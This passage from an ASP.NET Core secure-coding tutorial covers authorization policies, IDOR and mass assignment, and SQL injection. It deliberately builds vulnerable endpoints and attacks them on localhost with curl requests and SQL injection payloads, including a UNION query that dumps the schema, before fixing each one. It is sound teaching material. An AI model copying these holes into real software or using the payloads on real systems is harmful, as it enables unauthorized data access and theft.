- **2000s — Claims-based identity:** identity systems (Microsoft's WIF, then .NET) began describing users as a bag of *asserted facts* — `email=...`, `age_verified=true`, `dept=finance` — issued by someone trustworthy, evaluated by *your* rules.
- **2016 — ASP.NET Core's policy model:** roles and claims were unified under **policies** — composable, code-defined rules ("document is in draft AND user is in the document's department") evaluated by a central service. Under the hood, `[Authorize(Roles = "Admin")]` is compiled into a policy too — the attribute is sugar; the policy is the machinery.

### 10.3 The Three Layers, Word by Word

- **Role** *(word-by-word: a part played by an actor — a named bundle of permissions worn by a user)*: `"Admin"`, `"Support"`. Simple, coarse, universal. In .NET: a specific kind of **role claim** on the principal.
- **Claim** *(word-by-word: an assertion that something is true; a demand of truth from its issuer)*: any name-value pair asserted about the user — `FullName: "Ali"`, `DateOfBirth: "2006-04-12"`, `Tenant: "Acme"`, `Role: "Admin"`. Claims come from wherever identity came from: the auth cookie (Ch. 7), the JWT (Ch. 8), the OIDC provider (Ch. 9), or computed at request time by a **claims transformation** step. *Roles are just claims with a well-known name* — a fact that dissolves most confusion.
- **Policy** *(word-by-word: a declared rule evaluated by a central authority)*: the .NET unit of authorization: a named set of **requirements** checked by **handlers**. `[Authorize(Policy = "AdultOnly")]` → the framework runs every handler registered for the policy's requirements → any handler calling `Succeed` grants; otherwise deny.

```
User (principal) ──carries──► Claims  ──evaluated by──► Policies ──enforced at──► [Authorize]
   "role=Admin"                  "dob=1998-02-11"        "AdultOnly: age ≥ 18"
```

### 10.4 Seeing Your Claims (Before Building on Them)

Add a temporary debug page — `Controllers/WhoAmIController.cs`:

```csharp
[Authorize]
public class WhoAmIController : Controller
{
    public IActionResult Index()
    {
        var lines = User.Claims                                    // 1
            .Select(c => $"{c.Type,-40} = {c.Value}")
            .ToList();
        return Content(string.Join("\n", lines), "text/plain");    // 2
    }
}
```

1. `User.Claims` — every claim on the current principal, straight from the cookie. You will see `ClaimTypes.NameIdentifier` (the `Id`), `ClaimTypes.Name` (email), `AspNet.Identity.SecurityStamp`, and — once we add roles — `ClaimTypes.Role`.
2. `Content(..., "text/plain")` — raw output, no view. [ANALYST LENS] debug pages like this are gold for understanding, and a finding if they ship to production with secrets in claims (Ch. 19: audit what you put in tokens *before* it leaks).

### 10.5 Seeding Roles, Line by Line

`IdentityRole` rows must exist before assignment. Create `src/SecureShop.Web/Data/DbInitializer.cs`:

```csharp
using Microsoft.AspNetCore.Identity;
using Microsoft.Extensions.DependencyInjection;

namespace SecureShop.Web.Data;

public static class DbInitializer
{
    public static async Task SeedAsync(IServiceProvider services)     // 1
    {
        var roleManager = services.GetRequiredService<RoleManager<IdentityRole>>();   // 2
        var userManager = services.GetRequiredService<UserManager<AppUser>>();

        string[] roleNames = ["Admin", "Customer"];                   // 3
        foreach (var name in roleNames)
        {
            if (!await roleManager.RoleExistsAsync(name))             // 4
                await roleManager.CreateAsync(new IdentityRole(name));
        }

        const string adminEmail = "admin@secureshop.test";            // 5
        var admin = await userManager.FindByEmailAsync(adminEmail);
        if (admin is not null && !await userManager.IsInRoleAsync(admin, "Admin"))
        {
            await userManager.AddToRoleAsync(admin, "Admin");        // 6
        }
    }
}
```

1. Receives the **service provider** — the DI container itself — because seeding is a startup task outside normal request DI.
2. `GetRequiredService<T>` — fetch services manually (the only idiomatic place to do so: composition root / startup code).
3. Collection expression (`[...]`) — current C# array syntax. Roles are plain names — their *meaning* lives entirely in your `[Authorize]` checks.
4. `RoleExistsAsync` — idempotent seeding *(re-runnable without error)*; the `AspNetRoles`/`AspNetUserRoles` tables from Chapter 6 receive the writes.
5. [DANGER] A **hardcoded bootstrap admin** is a necessary pattern (someone must own the system on day one) — and a standing finding if the password is hardcoded too. Production pattern: generate a random one-time password, log it once, force rotation at first login (Ch. 18's rate limiting and Ch. 19's audit trail cover the rest). For the lab we trust our own machine.
6. `AddToRoleAsync` — writes the `AspNetUserRoles` link; the SecurityStamp is refreshed; **the user's existing cookie silently gains the new role at next request** (claims re-issued — recall Ch. 6 § 6.5's stamp mechanics).

Call it in `Program.cs`, after `Build()`, before `Run()`:

```csharp
using (var scope = app.Services.CreateScope())          // 1
{
    await DbInitializer.SeedAsync(scope.ServiceProvider);
}
```

1. `CreateScope()` — scoped services (like DbContext) must live inside an explicit **scope** (a DI lifetime boundary); the using-block disposes it cleanly. A `using` + await at the top of `Program.cs` is the standard seeding idiom.

### 10.6 Enforcing Roles: The Admin Product Management

Create `src/SecureShop.Web/Controllers/AdminController.cs`:

```csharp
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using SecureShop.Web.Data;

[Authorize(Roles = "Admin")]                       // 1
public class AdminController : Controller
{
    private readonly AppDbContext _db;
    public AdminController(AppDbContext db) => _db = db;

    public async Task<IActionResult> Products()    // 2
    {
        var products = await _db.Products.ToListAsync();
        return View(products);
    }
}
```

1. Controller-level gate — every action in this class requires an authenticated, `Admin`-roled principal. Placement is strategy: **class-level default-deny + `[AllowAnonymous]` exceptions** (Ch. 7's rule) — versus action-level, where a *new* action is unprotected until someone remembers its attribute. One merged file, two different risk profiles.
2. Plain actions — protected purely by the class attribute. [LAB] Verify the negative space yourself: log in as a non-admin → `/Admin/Products` → `AccessDeniedPath` (Chapter 7's UX). You should be able to predict the HTTP status for `/Admin/Products` with *no cookie* (302 to login) and with a *non-admin cookie* (302 to access-denied) *before* you try it.

### 10.7 Policies: The Custom `AdultOnly` Example, Line by Line

Roles cannot answer "is the user 18?" — nothing about a role name computes age. Policies express *rules*:

```csharp
// Program.cs
builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("CanManageProducts",                    // 1
        policy => policy.RequireRole("Admin"));

    options.AddPolicy("AdultOnly",                            // 2
        policy => policy.Requirements.Add(new MinimumAgeRequirement(18)));
});
```

1. A policy assembled from built-in builders: exactly the role check, but named and reusable — `[Authorize(Policy = "CanManageProducts")]`. When the rule changes ("admins *or* store managers"), one line changes.
2. A policy with a **custom requirement** — no built-in builder for age, so we author the machinery: the requirement (data) and the handler (logic).

Create `src/SecureShop.Web/Security/MinimumAgeRequirement.cs`:

```csharp
using Microsoft.AspNetCore.Authorization;

namespace SecureShop.Web.Security;

public class MinimumAgeRequirement(int minimumAge)            // 1
    : IAuthorizationRequirement
{
    public int MinimumAge { get; } = minimumAge;
}
```

1. A requirement is a **plain data class** implementing the marker interface `IAuthorizationRequirement` — no logic, deliberately. Separating *what is required* from *how to evaluate it* lets multiple handlers evolve independently (e.g., one reading `date_of_birth` claims, another reading `age_verified`).

Create `src/SecureShop.Web/Security/MinimumAgeHandler.cs`:

```csharp
using Microsoft.AspNetCore.Authorization;
using System.Security.Claims;

namespace SecureShop.Web.Security;

public class MinimumAgeHandler                                  // 1
    : AuthorizationHandler<MinimumAgeRequirement>
{
    protected override Task HandleRequirementAsync(
        AuthorizationHandlerContext context,                  // 2
        MinimumAgeRequirement requirement)                    // 3
    {
        Claim? dob = context.User.FindFirst("date_of_birth");  // 4
        if (dob is null) return Task.CompletedTask;            // 5

        if (!DateTime.TryParse(dob.Value, out var birth))     // 6
            return Task.CompletedTask;

        var today = DateTime.Today;
        int age = today.Year - birth.Year;                     // 7
        if (birth.Date > today.AddYears(-age)) age--;

        if (age >= requirement.MinimumAge)                      // 8
            context.Succeed(requirement);                       // 9

        return Task.CompletedTask;
    }
}
```

1. Handlers are **DI-registered classes**; the generic parameter binds this handler to one requirement type.
2. `context` — carries the `ClaimsPrincipal`, the resource under authorization (unused here; Ch. 11 uses it), and the outcome state.
3. The requirement instance (with its `MinimumAge`) — the *data* half from the policy.
4. Read the claim — the user's asserted date of birth. It exists only if someone put it there: the admin UI, an OIDC provider, or a claims transformation. [ANALYST LENS] Trace claims to their **issuer**: a `date_of_birth` claim from a user-editable profile form and one from a government IdP are different levels of trust wearing the same name.
5. **Fail-closed silence**: no claim / unparseable claim ⇒ do nothing. No `Succeed` call ⇒ the requirement fails ⇒ policy denies. Handlers never "fail loudly"; absence of success *is* the denial.
6. `TryParse` — never trust claim *formats* (they are strings from a token).
7. Leap-year-correct age math — the boring lines that make policy code real code.
8. The comparison against the requirement — the actual business rule, one line, now centrally tested.
9. `context.Succeed(requirement)` — grant *this requirement*. Policies with multiple requirements need all to succeed (AND semantics); multiple *handlers* for the same requirement are OR (any handler may succeed). **And-ing requirements, or-ing handlers** — say it out loud once; it is the whole concurrency model.

Register the handler and use the policy:

```csharp
builder.Services.AddScoped<IAuthorizationHandler, MinimumAgeHandler>();   // 1
```

```csharp
[Authorize(Policy = "AdultOnly")]                 // 2
public class CheckoutController : Controller { ... }
```

1. Unregistered handler = silently dead policy. [DANGER] The most common policy bug in real codebases: the requirement exists, the attribute exists, the handler was never registered — everything compiles, *everyone is denied* (or worse, someone "fixes" it by weakening the attribute). Grep every custom `IAuthorizationRequirement` for a matching `AddScoped<IAuthorizationHandler,...>`.
2. Same attribute, stronger question. Your authorization vocabulary is now complete enough to express nearly any rule.

### 10.8 When Roles Are Enough, and When They Rot

Roles are perfect for coarse, stable groupings (`Admin`, `Support`). They rot when: the matrix of "who may do what to which row" grows (role names start encoding data: `Tenant42Editor`); or attributes need *per-row* context (may this user edit *this* order?). The .NET answer to context-dependent rules is **resource-based authorization** — `IAuthorizationService.AuthorizeAsync(user, resource, policy)` with handlers reading the resource — which is precisely where Chapter 11 goes, and where the #1 web vulnerability lives.

### 10.9 [ANALYST LENS] The Authorization Review Checklist

- Every state-changing controller/action has an authorization gate (class-level preferred).
- No authorization decisions in JavaScript, hidden fields, or links ("if (isAdmin) render button") — client-side UX, never server-side truth.
- Role/policy names match between registration, seeding, and attributes (string-typed — typos fail *open* in the sense that an unknown role in `[Authorize(Roles="Admim")]` simply never matches... but an unregistered policy name *throws*; know both failure modes).
- Every custom requirement has a registered handler.
- Claims are traced to trustworthy issuers; user-editable data is not used as authorization facts.
- `[AllowAnonymous]` occurrences are listed and justified.

### 10.10 Recap

- Claims are facts about the user; roles are a special claim; policies are named rules over requirements, evaluated by handlers; `[Authorize]` is the enforcement point for all of it.
- Seed idempotently at startup; manage placement strategy (class-level, exceptions with `[AllowAnonymous]`).
- Requirements = data, handlers = logic, `Succeed` = grant; missing success is denial; register handlers or policies silently die.
- Roles rot with data-dependence and per-row context — which is exactly the cliff edge of Chapter 11.

**Next:** A01 — Broken Access Control. We build the vulnerability *ourselves*, attack it as an outsider would, and then fix it properly — the single most valuable hour of this entire guide.
## Chapter 11: Broken Access Control and IDOR

> "The door was locked. The lock just wasn't attached to anything."

### 11.1 What You Will Learn in This Chapter

OWASP A01 — Broken Access Control — is the #1 application security risk in the 2021 Top 10, present in test findings for the overwhelming majority of applications tested. This chapter does something most tutorials refuse to: we write the vulnerability ourselves, attack it exactly as an outsider would, and only then fix it — line by line. You will learn the two failure directions (**vertical** and **horizontal**), the art of **IDOR** (Insecure Direct Object References), why ownership checks must come from the session and never from the request, mass-assignment as an access-control bug, when to answer `404` vs `403`, and the analyst's deliverable that pins this whole class down: the **access-control matrix**.

### 11.2 History and Anatomy of the #1

Access-control failures predate the web (time-sharing systems had them), but the web made them industrial. The classic pattern: a developer wires authentication carefully (login feels important, gets attention), then writes endpoints that answer "*here is order #1001's data*" and simply forgets to ask *whose* #1001. Authentication matured into frameworks; authorization decisions are **per-endpoint business logic** — a thousand little doors, each with its own forgotten bolt. 2021's OWASP re-ranking moved A01 from #5 (2017) to #1: analysis of bug-bounty and breach data showed more *real exploitation* came from these logic bugs than from injection.

The two directions of failure, word by word:

- **Vertical escalation** — a less-powerful identity performs a more-powerful action: a customer calling `/Admin/DeleteUser`. Missing role gate, unprotected admin route, a debug endpoint left enabled.
- **Horizontal escalation (IDOR)** — identity A reads/writes identity B's *same-tier* data: your order, your invoice, your profile. The server answers "give me object #1001" without checking that object #1001 belongs to the caller. **IDOR** *(word-by-word: Insecure **D**irect **O**bject **R**eference — the URL refers *directly* to an object, insecurely, because the reference itself is the only "authorization")*. IDOR is the most common, most under-fixed vulnerability in real business applications — it leaks PII by the million while every scanner stays green.

### 11.3 Build the Vulnerable Orders Endpoint

Add `Order` to `SecureShop.Core/Models`:

```csharp
public class Order
{
    public int Id { get; set; }                                    // 1
    public Guid UserId { get; set; }                              // 2
    public DateTime PlacedAtUtc { get; set; }
    public decimal Total { get; set; }
    public string Status { get; set; } = "Processing";
    public string ShippingAddress { get; set; } = string.Empty;   // 3
}
```

1. **Sequential integer** — deliberate (for now). Legitimate, human, and a tutorial for attackers: `/api/orders/1001`, `1002`, `1003`... an enumeration ladder.
2. `UserId` — the owning identity: our JWT's `sub` claim (a `Guid`, Chapter 8). *This column is the entire fix, waiting to be used.*
3. Shipping address — realistic PII, so the demo *feels* like the breach it simulates.

Create `src/SecureShop.Api/Controllers/OrdersController.cs`:

```csharp
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using SecureShop.Core.Models;

namespace SecureShop.Api.Controllers;

[ApiController]
[Route("api/[controller]")]
public class OrdersController : ControllerBase
{
    private static readonly List<Order> _orders = new()           // 1
    {
        new() { Id = 1001, UserId = Guid.Parse("11111111-1111-1111-1111-111111111111"),
                PlacedAtUtc = DateTime.UtcNow.AddDays(-2), Total = 36.50m,
                ShippingAddress = "1 Customer Lane, Cairo, Egypt" },
        new() { Id = 1002, UserId = Guid.Parse("22222222-2222-2222-2222-222222222222"),
                PlacedAtUtc = DateTime.UtcNow.AddDays(-1), Total = 21.00m,
                ShippingAddress = "7 Buyer Street, Alexandria, Egypt" },
        new() { Id = 1003, UserId = Guid.Parse("33333333-3333-3333-3333-333333333333"),
                PlacedAtUtc = DateTime.UtcNow.AddHours(-6), Total = 18.50m,
                ShippingAddress = "42 Shopper Road, Giza, Egypt" }
    };

    [HttpGet("{id:int}")]
    [Authorize]                                                   // 2
    public ActionResult<Order> GetById(int id)
    {
        var order = _orders.FirstOrDefault(o => o.Id == id);       // 3
        return order is null ? NotFound() : Ok(order);
    }
}
```

1. Seeded orders belonging to three *other* people (fixed GUIDs — never you).
2. `[Authorize]` — and this is the trap: it *feels* secure. "Requires login." It answers *"is someone logged in?"* — not *"does this someone own this order?"*
3. The vulnerable line, line-by-line: `o.Id == id` — a filter on the **URL's id only**. `UserId` sits right there in every row — unused. That unused column is the vulnerability.

### 11.4 ATTACK: Reading Strangers' Orders

```bash
# Register and log in as yourself (Ch. 8 flow):
curl -s -X POST https://localhost:7102/api/auth/login -H "Content-Type: application/json" \
     -d '{"username":"attacker","password":"IReadChapter11First!"}'
# → copy your token, then:
curl -s https://localhost:7102/api/orders/1001 -H "Authorization: Bearer $TOKEN"
```

Response:

```json
{ "id": 1001, "userId": "11111111-…", "placedAtUtc": "…",
  "total": 36.50, "status": "Processing",
  "shippingAddress": "1 Customer Lane, Cairo, Egypt" }
```

You just read a stranger's home address with **a valid token for a different person**. Nobody "hacked" anything: no crypto broken, no injection, no malware — the server checked the front door (authentication) and then handed you someone else's mail. Wrap it in a loop (`1001..2000`) and you have today's news: *"API exposed 1.3M customer records."*

The **vertical** twin is equally trivial — remove the role from Chapter 10's product-create attribute and *any* logged-in customer creates products or edits prices:

```csharp
[HttpPost]
[Authorize]                        // ← was: [Authorize(Roles = "admin")]  // VULNERABLE
public ActionResult<Product> Create(Product product) ...
```

> [ATTACK] Attacker's rule of thumb, memorize it as your analyst's: **every ID in a URL is a door. The question is never "can I guess the next ID" (I can) — it is "does the server check ownership before opening?"**

### 11.5 The Fix, Line by Line

```csharp
using System.Security.Claims;                                     // 1
using System.IdentityModel.Tokens.Jwt;

    [HttpGet("{id:int}")]
    [Authorize]
    public ActionResult<Order> GetById(int id)
    {
        string? sub = User.FindFirstValue(JwtRegisteredClaimNames.Sub);   // 2

        if (!Guid.TryParse(sub, out var userId))                   // 3
            return Forbid();

        var order = _orders.FirstOrDefault(o => o.Id == id
                                              && o.UserId == userId);    // 4

        if (order is null)
            return NotFound();                                     // 5

        return Ok(order);
    }
```

1. `System.Security.Claims` for `FindFirstValue`; `System.IdentityModel.Tokens.Jwt` for the claim name constant.
2. **The identity comes from the validated token** — the `sub` claim the server *proved* in Chapter 8 — never from the URL, body, or a hidden field. This single sourcing rule is the heart of the entire chapter: *who you are is what the server signed; what you ask for is what the URL says.* Never confuse them.
3. `Guid.TryParse` — a claim is a string; malformed/missing identity fails closed with `403` (`Forbid()` — the Ch. 2 word: "I know you; you may not").
4. **The line that kills the bug:** the filter now demands *both* — right object **and** right owner. An IDOR-proof query has ownership in every `WHERE`.
5. `404`, not `403`, for *other people's* objects — deliberate: a `403` confirms "that object exists, but not yours," leaking existence (and inviting probing); `404` says "nothing here" and is indistinguishable from a dead ID. Trade-off: legitimate users debugging their own missing order lose a hint. [RULE] For horizontal (other-user) objects: `404`. For same-tier administrative denials (you lack the role): `403`. Write the decision down; consistency is a control.

**The admin variant** needs the *opposite* shape — role gate **without** ownership (support staff may read any order), on its own endpoint, with its own attribute:

```csharp
[HttpGet("admin/{id:int}")]
[Authorize(Roles = "admin")]                                      // 1
public ActionResult<Order> GetAnyById(int id)
{
    var order = _orders.FirstOrDefault(o => o.Id == id);
    return order is null ? NotFound() : Ok(order);
}
```

1. Vertical access (role) and horizontal access (ownership) are **different checks on different doors** — never share one endpoint with an `if (isAdmin || isOwner)` shortcut; the OR is where the next bug hatches.

### 11.6 The MVC Mirror (Same Bug, Different Costume)

MVC IDOR hides in route values and form posts. A classic vulnerable `Products` admin page:

```csharp
// VULNERABLE: mass assignment + missing ownership checks
[HttpPost]
[ValidateAntiForgeryToken]
public async Task<IActionResult> Edit(Product model)              // 1
{
    _db.Products.Update(model);                                    // 2
    await _db.SaveChangesAsync();
    return RedirectToAction("Products");
}
```

1. `Edit(Product model)` — model binding takes **the whole entity** from the form. Remember Chapter 1's law: the client may post *any* fields. The rendered form posts `Name` and `Description`... but the attacker's POST (curl or devtools-edited form) adds `"Price": 0.01, "Id": 17` — **mass assignment** *(binding user input directly onto a privileged object, overwriting fields the UI never showed)*. Shopping spree for one cent; or with identity entities — `"Role": "Admin"`.
2. `Update(model)` — persists whatever came in. Three bugs stacked: no ownership/role check on *which product*; blind trust in *every field*; and even the `Id` is attacker-chosen (they can overwrite a different row than the one displayed).

The fix — a **dedicated edit view model** and explicit checks:

```csharp
public class ProductEditViewModel                                  // 1
{
    [Required, StringLength(100)]
    public string Name { get; set; } = string.Empty;
    [StringLength(500)]
    public string Description { get; set; } = string.Empty;
}

[HttpPost]
[ValidateAntiForgeryToken]
[Authorize(Roles = "Admin")]                                      // 2
public async Task<IActionResult> Edit(int id, ProductEditViewModel model)   // 3
{
    var product = await _db.Products.FindAsync(id);
    if (product is null) return NotFound();

    product.Name = model.Name;                                    // 4
    product.Description = model.Description;

    await _db.SaveChangesAsync();
    return RedirectToAction("Products");
}
```

1. **The whitelist, as a type.** Binding now *cannot* touch `Price` or `Id` — the type simply has no such properties. [RULE] Never bind requests directly onto entities; bind onto **view models** (allow-lists by construction) and copy fields explicitly. `Id` comes from the route (line 3), not the body — the URL *names* the object; the body *describes* changes.
2. The vertical gate, at the class or action level (Chapter 10).
3. `Edit(int id, ...)` — the route supplies `id`; binding supplies the whitelisted fields; two sources, no mixing.
4. Explicit field-by-field copy — the "boring" lines that make the whole exploit class structurally impossible. Boring, in security, is a *compliment*.

### 11.7 User-Supplied Identity: The Counter-Example You Must Learn to Spot

The fix's line 2 established a law. Here is the violation, seen weekly in real code:

```csharp
// VULNERABLE: "who am I?" taken from the request
[HttpPut("api/orders/{id}")]
public async Task<IActionResult> Update(int id, OrderUpdateRequest request)
{
    var order = await _db.Orders.FindAsync(id);
    order.UserId = request.UserId;              // ← attacker posts any UserId
    ...
}
```

Whenever you see identity or ownership fields (`UserId`, `TenantId`, `CreatedBy`, `Role`) coming from the request — body, query, hidden input, header — you are looking at a broken-access-control finding in its larval form. Ownership comes from `User` claims; tenants come from a trusted mapping of *who you are → which tenant*, never from a field the caller typed.

### 11.8 Resource-Based Authorization: The Framework's Way (Preview)

For richer per-object rules ("edit only *drafts* in *my* department"), Chapter 10's policy machinery extends to objects via `IAuthorizationService`:

```csharp
public class OrderEditHandler : AuthorizationHandler<OrderEditRequirement, Order>
{
    protected override Task HandleRequirementAsync(
        AuthorizationHandlerContext context,
        OrderEditRequirement requirement, Order resource)          // 1
    {
        string? sub = context.User.FindFirstValue(JwtRegisteredClaimNames.Sub);
        if (Guid.TryParse(sub, out var id) && resource.UserId == id && resource.Status == "Draft")
            context.Succeed(requirement);                          // 2
        return Task.CompletedTask;
    }
}

// in the controller:
var auth = await _authorizationService.AuthorizeAsync(User, order, "CanEditOrder");  // 3
if (!auth.Succeeded) return NotFound();
```

1. The handler now receives the **resource** itself — access control with the object in hand, exactly what attributes cannot see.
2. Rule = ownership **and** state — the kind of business rule that makes "just add `[Authorize]`" hopeless.
3. Called explicitly in the action: fetch → authorize-against-object → act. This is the professional end-state for horizontal logic; you now know the whole ladder: attribute → policy → resource handler.

### 11.9 Are GUIDs a Fix? (No — Learn the Reasoning)

Swapping `int` IDs for GUIDs (Chapter 6's Identity already uses them) makes enumeration *harder* — an attacker can't walk `1001, 1002`. But IDs leak from everywhere anyway: browser history, logs, screenshots, emails, API responses listing *your* orders (whose IDs appear next to items), or by chaining another minor bug. **Unpredictability is not authorization.** Obscurity at best shrinks the attack surface; only the ownership check makes the door stay shut. GUIDs are fine as *defense in depth* — and as an analyst you will find IDOR on GUID systems *constantly*, because someone believed this paragraph's opposite.

### 11.10 The Access-Control Matrix (The Analyst Deliverable)

The professional artifact that ends this chapter — draw one for every system you review:

| Endpoint | Anonymous | Customer (self data) | Other customer's data | Admin |
|---|---|---|---|---|
| `GET /api/products` | allow | allow | allow | allow |
| `GET /api/orders/{id}` | deny (401) | **allow (owner)** | **deny (404)** | allow (admin route) |
| `POST /api/products` | deny | deny | deny | **allow only** |
| `PUT /api/orders/{id}` | deny | allow (owner, draft) | deny (404) | allow (admin route) |
| `/Admin/Products` | deny | deny | deny | allow |

Then walk every cell against the code. Broken access control *is* the gap between the matrix you believe and the code that exists.

### 11.11 [ANALYST LENS] Hunting Checklist

- For each endpoint: is there *any* authorization attribute or service call? (grep `public.*Task<IActionResult>` inside controllers and compare against `[Authorize` coverage)
- For each data access: does the `WHERE` include ownership for non-admin paths?
- Are ownership/identity fields ever bound from requests (mass assignment)?
- `403` vs `404` consistency for horizontal denials?
- Admin routes on separate paths with role gates (no `isAdmin || isOwner`)? Debug/test endpoints removed in prod?
- Client-side gating only (hidden buttons/links) — never accepted as enforcement?
- GUID IDs treated as obscurity, not authorization?

### 11.12 Recap

- A01 = the #1 real-world risk: vertical (missing role gates) and horizontal (IDOR — object references without ownership checks).
- Ownership facts come from validated session claims — never URLs, bodies, or hidden fields.
- Fix pattern: `WHERE id == requested && owner == User`; horizontal denials answer `404`; admin is a *separate* endpoint; bind requests to allow-listed view models (mass assignment is access control).
- Resource-based handlers carry per-object business rules; GUIDs are depth, not defense; the access-control matrix is the artifact that makes review tractable.

**Next:** Part IV opens the attack catalog proper: SQL injection — the 27-year-old bug that still wins breach-of-the-year, executed by you, against your own database, then buried forever by parameters.
# Part IV: The Attack Catalog — OWASP Top 10 on Real .NET Code

> Chapters 12-16 are the heart of your attacker education. Each chapter follows the same arc: **history → mechanism → we build the vulnerability → we attack it → we fix it line by line**. You do this only against `localhost`, and only code you own. By the end of Part IV there is no injection class in the Top 10 you haven't both caused and cured.

## Chapter 12: SQL Injection

> "The 27-year-old bug that never retired."

### 12.1 What You Will Learn in This Chapter

SQL injection (OWASP A03) is user input executed as database code. You will learn how a database actually parses a query (the mechanism that makes the attack possible), build a genuinely vulnerable product search into SecureShop, run three escalating attacks against your own SQLite database — including dumping the schema — and then apply the permanent fixes: `FromSqlInterpolated`, explicit parameters, and LINQ, line by line. You will also learn the concepts scanners can't see: **blind** injection, **second-order** injection, and why error messages are an attack tool.

### 12.2 History

- **1998** — Rain Forest Puppy's advisories (Bugtraq) against CGI scripts are the first widely-publicized "user input becomes SQL" attacks; the era of *string-built queries meets the public Internet*.
- **1999-2005** — the technique is systematized: papers and tools (e.g., "Advanced SQL Injection" era), and `sqlmap` (2006) automates exploitation end to end. Attack cost drops to zero.
- **2000s-2010s — era of mega-breaches:** Heartland Payment Systems (2008, ~130M cards — SQLi as entry point), Sony Pictures (2011, SQLi: 77M accounts), TalkTalk (2015, SQLi on a legacy page; £400,000 UK fine + stock drop). Regulators now explicitly name SQLi.
- **The defense has been perfect and boring since the beginning:** parameterized queries. The vulnerability survives purely because developers keep *building SQL out of strings* — with today's ORMs, you have to actively try.

### 12.3 The Mechanism: How a Query Becomes an Attack

A database receives a query as **text**, then parses it into structure (`SELECT these columns FROM this table WHERE this condition`). One parser pass: it cannot tell which characters came from your code and which came from the user — there is no watermark. Now watch a search box flow into a "built" query:

```csharp
// developer's intent:
"SELECT * FROM Products WHERE Name LIKE '%" + q + "%'"

// user types:  coffee
"SELECT * FROM Products WHERE Name LIKE '%coffee%'"

// user types:  ' OR 1=1 --
"SELECT * FROM Products WHERE Name LIKE '%' OR 1=1 --%'"
```

Parse the third one with the database's eyes: `'...'` closes the string; `OR 1=1` appends a tautology (always true); `--` comments the rest (the trailing `%'` becomes dead text). **The user changed your query's grammar.** From here, everything else in this chapter is escalation, and the entire fix is a single idea: **send the query and the data through separate channels** (parameters), so data can never be *parsed* as grammar.

### 12.4 Building the Vulnerable Search

The MVC app has EF Core (Chapter 6) — and raw string SQL, in one line. Add to `HomeController`:

```csharp
public async Task<IActionResult> Search(string q)
{
    var sql = $"SELECT * FROM Products " +
              $"WHERE Name LIKE '%{q}%' OR Description LIKE '%{q}%'";   // 1

    var products = await _db.Products
        .FromSqlRaw(sql)                                                // 2
        .ToListAsync();
    return View("Index", products);
}
```

1. `$"...{q}..."` — **string interpolation baked into SQL**: `q` is pasted into the query text before the database ever sees it. `FromSqlRaw` *(word-by-word: "from SQL, raw" — execute this SQL string, unprocessed)* exists for reporting-style queries and dynamic sorting — and exists as the single most misused API in .NET.
2. Add `?q=` to the product list page's route and a small search form — the feature now works beautifully. It worked for TalkTalk's attackers, too.

> [ANALYST LENS] Your first professional grep, the one you run before reading any code:
> `rg -n "FromSqlRaw|ExecuteSqlRaw|CommandText|new SqlCommand|\\$\"SELECT|\\+ .*SELECT" --type cs`
> Every hit is a manual review. Every interpolation inside it is a finding until proven parameterized.

### 12.5 ATTACK: Three Payloads, One Afternoon

`[LAB]` Run the app; browse `https://localhost:7101/Home/Search?q=...` with each payload (URL-encode `'` as `%27`, spaces as `%20` where needed):

**Payload 1 — the tautology (existence proof):**
```text
' OR 1=1 --
```
Result: *every* product is returned — the WHERE clause is now always true. No data stolen yet, but the attacker has confirmed: **input reaches SQL as code.**

**Payload 2 — breaking the shape (error reconnaissance):**
```text
' UNION SELECT --
```
Result: an `SqliteException` — possibly shown in the error page (Development environment!) telling the attacker the column count mismatch. [DANGER] Every raw SQL error is reconnaissance. Chapter 19's error handling exists precisely to deny this.

**Payload 3 — schema theft (UNION-based exfiltration):**
The `Products` table has 5 columns, so we align a second query with 5 columns. SQLite helpfully keeps its entire schema in a table called `sqlite_master`:

```text
' UNION SELECT Id, sql, NULL, NULL, NULL FROM sqlite_master --
```

Result on screen: instead of products, the page now renders **the raw CREATE TABLE statements of the whole database** — the attacker's map, including the `AspNetUsers` table from Chapter 6. In the real world, the next payload is a `WHERE` on `PasswordHash` and the breach is on the evening news. In our lab, the response is sobering enough:

```
CREATE TABLE "AspNetUsers" (
    "Id" TEXT NOT NULL,
    "PasswordHash" TEXT,
    ...
```

> [ATTACK] Two concepts scanners under-appreciate: **blind SQLi** — no visible error, but the attacker infers answers from *timing* (`' AND (SELECT heavy-thing) --`) or differing page content (the boolean oracle); the attack is identical, only the feedback channel changes. **Second-order SQLi** — a payload is *stored* safely today (in a properly parameterized insert!) and *executed* later when a different code path builds a query from the stored value. Your grep must therefore include queries built from *database* columns, not just request inputs.

### 12.6 The Fix, Line by Line — All Four Forms

**Form 1 — `FromSqlInterpolated` (the drop-in fix):**

```csharp
public async Task<IActionResult> Search(string q)
{
    var like = $"%{q}%";                                            // 1
    var products = await _db.Products
        .FromSqlInterpolated($"SELECT * FROM Products " +
            $"WHERE Name LIKE {like} OR Description LIKE {like}")  // 2
        .ToListAsync();
    return View("Index", products);
}
```

1. The `%` wildcards are *ours*, so we wrap them here.
2. Looks identical to the vulnerable code — **and that is the trap and the lesson**: `FromSqlInterpolated` takes an `FormattableString` *(an interpolation object .NET can keep *unresolved*, not just concatenated text)*. EF Core turns each `{hole}` into a **real SQL parameter** (`@p0`, `@p1`) with the value bound separately. The database receives the grammar once, the data separately, and `q` — whatever it contains — is *a value*, forever un-parsable as keywords. [DANGER] The two APIs are one character apart (`Raw` vs `Interpolated`) with opposite security meanings. Reviewers: read every `FromSql*` call letter by letter.

**Form 2 — explicit parameters (showing the machinery plainly):**

```csharp
var sql = "SELECT * FROM Products WHERE Name LIKE @pattern OR Description LIKE @pattern";
var products = await _db.Products
    .FromSqlRaw(sql, new SqlParameter("@pattern", like))           // 1
    .ToListAsync();
```

1. Now `FromSqlRaw` is *safe*: the string is a constant (no interpolation), and the value rides along as a named parameter object. `@pattern` inside quotes is literal text until binding time; the driver guarantees `q` can never terminate the string.

**Form 3 — LINQ (the default, and why you rarely need raw SQL at all):**

```csharp
var products = await _db.Products
    .Where(p => p.Name.Contains(q) || p.Description.Contains(q))   // 1
    .ToListAsync();
```

1. EF Core **translates** the lambda into parameterized SQL (`WHERE Name LIKE @q` — `Contains` becomes `LIKE`). Injection-proof *by construction*, because the query's grammar is built by the provider, from code, and the user's text only ever fills parameters. [RULE] Reach for raw SQL rarely (reporting queries, window functions, bulk operations) — and when you do, Forms 1-2 above are the only legal shapes.

